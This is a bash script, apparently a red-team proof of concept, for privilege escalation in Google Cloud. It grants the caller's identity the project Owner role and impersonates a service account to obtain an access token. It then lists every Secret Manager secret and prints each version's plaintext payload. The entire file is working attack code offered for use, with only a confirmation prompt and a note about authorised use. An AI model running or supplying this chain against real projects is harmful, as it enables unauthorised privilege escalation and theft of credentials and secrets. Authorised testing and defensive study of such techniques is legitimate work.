#!/usr/bin/env bash

# ================================================
# GCP Escalation Chain PoC - Full Chain
# 1. Self-grant Owner via setIamPolicy (additive)
# 2. Impersonate target SA (actAs + token)
# 3. Enumerate & dump secrets (all versions, plaintext)
# Fully dynamic - no hardcoded project or SA
# ================================================

set -o pipefail

echo "GCP Escalation Chain PoC - Full Chain"
echo "Red Team Tool | Dynamic Discovery | Console-only"
echo ""

PROJECT_ID=""
TARGET_SA=""

# Parse arguments
while [[ $# -gt 0 ]]; do
  case $1 in
    --target-sa)
      shift
      TARGET_SA="$1"
      ;;
    *)
      PROJECT_ID="$1"
      ;;
  esac
  shift
done

# Dynamic PROJECT_ID
[ -z "$PROJECT_ID" ] && PROJECT_ID=$(gcloud config get-value project 2>/dev/null || echo '')

if [ -z "$PROJECT_ID" ]; then
  echo "Error: No PROJECT_ID provided and none set in gcloud config."
  echo "Usage: $0 [PROJECT_ID] [--target-sa SERVICE_ACCOUNT_EMAIL]"
  exit 1
fi

# Dynamic current identity
CURRENT_IDENTITY=$(gcloud config get-value account 2>/dev/null || echo "unknown")
if [[ "$CURRENT_IDENTITY" == *@*.iam.gserviceaccount.com ]]; then
  MEMBER="serviceAccount:$CURRENT_IDENTITY"
else
  MEMBER="user:$CURRENT_IDENTITY"
fi

# Dynamic target SA (auto-detect if not provided)
if [ -z "$TARGET_SA" ]; then
  echo "[+] No target SA provided — auto-detecting first non-current SA..."
  TARGET_SA=$(gcloud iam service-accounts list --project "$PROJECT_ID" \
    --format="value(email)" 2>/dev/null | grep -v "$CURRENT_IDENTITY" | head -n 1)
  
  if [ -z "$TARGET_SA" ]; then
    echo "[-] No other service accounts found. Provide --target-sa."
    exit 1
  fi
  echo "[+] Auto-selected target SA: $TARGET_SA"
fi

echo "[+] Target Project     : $PROJECT_ID"
echo "[+] Current Identity   : $CURRENT_IDENTITY"
echo "[+] Target SA          : $TARGET_SA"
echo ""

echo "!!! FULL ESCALATION CHAIN WILL BE EXECUTED !!!"
echo "1. Self-grant Owner on project"
echo "2. Impersonate target SA"
echo "3. Enumerate + dump ALL secrets (plaintext)"
echo ""
read -p "Type YES to proceed (authorized lab/engagement only): " confirm
if [[ "$confirm" != "YES" ]]; then
  echo "Aborted."
  exit 1
fi

# Step 1: Self-grant Owner (additive - safer)
echo ""
echo "[*] Step 1: Self-granting roles/owner..."
gcloud projects add-iam-policy-binding "$PROJECT_ID" \
  --member="$MEMBER" \
  --role="roles/owner" --quiet

echo "    [+] Owner binding applied (or already present)"
sleep 8

# Step 2: Impersonate via token (clean, no global config change)
echo ""
echo "[*] Step 2: Impersonating $TARGET_SA..."
ACCESS_TOKEN=$(gcloud auth print-access-token \
  --impersonate-service-account="$TARGET_SA" 2>/dev/null)

if [ -n "$ACCESS_TOKEN" ]; then
  echo "    [+] SUCCESS: Access token obtained"
else
  echo "    [-] Impersonation failed (check iam.serviceAccounts.actAs)"
  exit 1
fi

# Step 3: Enum + dump secrets using impersonation
echo ""
echo "[*] Step 3: Enumerating and dumping secrets as $TARGET_SA..."

# Use token for all commands (via --access-token-file or activate temporarily)
echo "Secrets List:"
gcloud secrets list --project "$PROJECT_ID" --access-token-file=<(echo "$ACCESS_TOKEN")

SECRETS=$(gcloud secrets list --project "$PROJECT_ID" --format="value(name)" --access-token-file=<(echo "$ACCESS_TOKEN") 2>/dev/null)

for secret in $SECRETS; do
  echo ""
  echo "=== Secret: $secret ==="
  echo "Versions:"
  gcloud secrets versions list "$secret" --project "$PROJECT_ID" --access-token-file=<(echo "$ACCESS_TOKEN")
  
  echo "Payloads (all versions):"
  VERSIONS=$(gcloud secrets versions list "$secret" --project "$PROJECT_ID" \
    --format="value(name)" --access-token-file=<(echo "$ACCESS_TOKEN") 2>/dev/null | awk -F/ '{print $NF}' | sort -n)
  
  for vid in $VERSIONS; do
    echo "  Version $vid:"
    PAYLOAD=$(gcloud secrets versions access "$vid" --secret="$secret" \
      --project "$PROJECT_ID" --access-token-file=<(echo "$ACCESS_TOKEN") 2>/dev/null)
    
    if [ -n "$PAYLOAD" ]; then
      echo "    ------------------------------------------------"
      echo "$PAYLOAD"
      echo "    ------------------------------------------------"
    else
      echo "    [empty payload]"
    fi
  done
done

echo ""
echo "--------------------------------------------------"
echo "Escalation chain complete"
echo "Project: $PROJECT_ID | Target SA: $TARGET_SA"
echo "Note: Owner role was added - manual cleanup recommended for OPSEC."
echo "Use responsibly in authorized environments only."
